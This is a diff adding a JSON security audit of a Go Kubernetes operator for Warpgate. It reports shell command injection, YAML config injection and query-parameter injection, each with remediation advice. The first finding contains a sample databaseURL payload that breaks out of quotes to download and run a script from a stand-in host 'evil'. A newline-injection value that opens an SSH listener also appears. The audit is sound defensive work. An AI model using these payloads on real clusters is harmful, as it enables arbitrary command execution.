@@ -1,0 +1,63 @@
+{
+  "summary": "Reviewed the warpgate-operator Go Kubernetes operator across cmd/, api/v1alpha1/ (webhooks/defaulters) and internal/ (warpgate REST client and the controllers). The operator is a controller-runtime manager that reconciles WarpgateInstance/Connection/Credential/Ticket CRs, builds Deployments/ConfigMaps/Secrets, and talks to the Warpgate admin API. The most serious issue is shell command injection: the WarpgateInstance reconciler concatenates the user-supplied spec.databaseURL into an init-container /bin/sh -c script with no sanitization and no webhook validation, so anyone able to create/update a WarpgateInstance can run arbitrary commands in the init container. Secondary issues are YAML config injection via unescaped spec fields written into warpgate.yaml, and unencoded search values placed directly into Warpgate admin API query strings. Manager/TLS setup (secure metrics, HTTP/2 disabled, webhook authz) looked sound; test files were not deeply audited.",
+  "coverage": [
+    "cmd/main.go",
+    "internal/controller/helpers.go",
+    "internal/controller/warpgateinstance_controller.go",
+    "internal/controller/warpgateconnection_controller.go",
+    "internal/controller/warpgatepasswordcredential_controller.go",
+    "internal/controller/warpgateticket_controller.go",
+    "internal/controller/httproute_watcher_controller.go",
+    "internal/warpgate/client.go",
+    "internal/warpgate/credentials.go",
+    "internal/warpgate/user.go",
+    "internal/warpgate/role.go",
+    "internal/warpgate/target.go",
+    "internal/warpgate/target_group.go",
+    "internal/warpgate/ticket.go",
+    "internal/warpgate/ssh_keys.go",
+    "internal/warpgate/parameters.go",
+    "api/v1alpha1/warpgateinstance_webhook.go"
+  ],
+  "findings": [
+    {
+      "title": "Shell command injection via spec.databaseURL in WarpgateInstance init container",
+      "category": "security",
+      "cwe": "CWE-78",
+      "severity": "high",
+      "confidence": "high",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 556,
+      "line_end": 558,
+      "description": "buildDeployment assembles a shell script (initScript) that is executed as the init container command `/bin/sh -c initScript` (see the InitContainers Command at lines 773-777). The user-controlled field inst.Spec.DatabaseURL is concatenated directly into that script via fmt.Sprintf(` --database-url \"%s\"`, inst.Spec.DatabaseURL). Because the value is embedded inside double quotes in the script *text* (not passed as a separate argv element or an environment variable), a databaseURL such as `sqlite:/data/db\"; wget http://evil/x -O /tmp/x; sh /tmp/x; echo \"` breaks out of the quotes and runs attacker commands in the init container. The WarpgateInstance validating webhook (api/v1alpha1/warpgateinstance_webhook.go, validateWarpgateInstance) only emits a warning for databaseURL and never rejects shell metacharacters, so the value reaches the sink unfiltered. Any principal with RBAC to create/update WarpgateInstance objects (e.g. a namespace tenant) can achieve arbitrary command execution in the pod the operator schedules. Note the admin password is handled safely by contrast (passed via the ADMIN_PASSWORD env var and expanded by the shell), which is the pattern databaseURL should follow.",
+      "evidence": "Line 549-558: setupCmd := fmt.Sprintf(`warpgate --skip-securing-files unattended-setup ... --admin-password \"${ADMIN_PASSWORD}\"`, ...) ; if inst.Spec.DatabaseURL != \"\" { setupCmd += fmt.Sprintf(` --database-url \"%s\"`, inst.Spec.DatabaseURL) }. setupCmd is joined into initScript (line 611) and run at lines 773-777: Command: []string{\"/bin/sh\", \"-c\", initScript}. Source: inst.Spec.DatabaseURL (CR spec) -> validateWarpgateInstance only warns (webhook lines 256-258) -> string concatenation into shell script -> /bin/sh -c.",
+      "recommendation": "Do not interpolate CR string fields into a shell script. Pass databaseURL to the setup binary via an environment variable sourced from the CR (like ADMIN_PASSWORD) and reference it as a shell variable, or invoke the setup command as an explicit argv slice rather than a `/bin/sh -c` string so arguments are never re-parsed by a shell. As defense in depth, add strict validation in the webhook (e.g. require a valid database URL scheme and reject shell metacharacters/newlines)."
+    },
+    {
+      "title": "YAML config injection via spec.externalHost/databaseURL in buildWarpgateConfig",
+      "category": "security",
+      "cwe": "CWE-74",
+      "severity": "medium",
+      "confidence": "medium",
+      "file": "internal/controller/warpgateinstance_controller.go",
+      "line_start": 379,
+      "line_end": 381,
+      "description": "buildWarpgateConfig generates the Warpgate `warpgate.yaml` by string-formatting user-controlled CR fields with no escaping. inst.Spec.ExternalHost is written as `external_host: <value>` and inst.Spec.DatabaseURL as `database_url: \"<value>\"` (lines 344-348). Neither is validated by the webhook. Because the value is placed into a structured YAML document verbatim, a field containing a newline (e.g. externalHost = \"example.com\\nssh:\\n  enable: true\\n  listen: 0.0.0.0:2222\") lets the creator of a WarpgateInstance inject or override arbitrary top-level configuration keys in the deployed Warpgate config, changing security-relevant settings (listeners, TLS, database). This is a distinct sink from the command-injection finding (the rendered ConfigMap consumed by the runtime container) but shares the same untrusted CR fields; databaseURL at lines 344-348 has the same flaw.",
+      "evidence": "Line 344-348: if inst.Spec.DatabaseURL != \"\" { fmt.Fprintf(&b, \"database_url: \\\"%s\\\"\\n\", inst.Spec.DatabaseURL) }. Line 379-381: if inst.Spec.ExternalHost != \"\" { fmt.Fprintf(&b, \"external_host: %s\\n\", inst.Spec.ExternalHost) }. Output stored in ConfigMap `<name>-config` (ensureConfigMap) and mounted into the runtime container as /data/warpgate.yaml.",
+      "recommendation": "Build the config with a real YAML marshaller (e.g. sigs.k8s.io/yaml or gopkg.in/yaml) that quotes/escapes values, instead of fmt.Fprintf into a string builder. Additionally validate externalHost as a hostname and databaseURL as a URL in the webhook, rejecting embedded newlines/control characters."
+    },
+    {
+      "title": "Unencoded search value in Warpgate admin API query strings (ListUsers/ListRoles/ListTargets)",
+      "category": "security",
+      "cwe": "CWE-88",
+      "severity": "low",
+      "confidence": "high",
+      "file": "internal/warpgate/user.go",
+      "line_start": 80,
+      "line_end": 83,
+      "description": "ListUsers appends the caller-provided search term straight onto the request path as `?search=` + search without URL-encoding it. The search term flows from CR spec fields, e.g. the password-credential controller resolves users by cred.Spec.Username via GetUserByUsername -> ListUsers(username). A username/name containing `&`, `#`, or additional `?search=...` fragments can inject or override query parameters on the Warpgate admin API call the operator makes with its privileged token, and characters like spaces produce malformed requests. Impact is limited (the operator is the client and re-checks the returned name for an exact match), so this is a robustness/parameter-injection issue rather than a direct compromise. The same unencoded pattern appears in ListRoles (internal/warpgate/role.go:59-63) and ListTargets (internal/warpgate/target.go:206-210).",
+      "evidence": "internal/warpgate/user.go:80-83: path := \"/users\"; if search != \"\" { path += \"?search=\" + search }; c.Get(path, &users). Source example: WarpgatePasswordCredential.Spec.Username -> GetUserByUsername -> ListUsers(username). Duplicated at role.go:62 and target.go:209.",
+      "recommendation": "Use net/url to build the query, e.g. url.Values{\"search\": {search}}.Encode(), or url.QueryEscape(search), so metacharacters are percent-encoded. Apply the same fix to ListRoles and ListTargets."
+    }
+  ]
+}
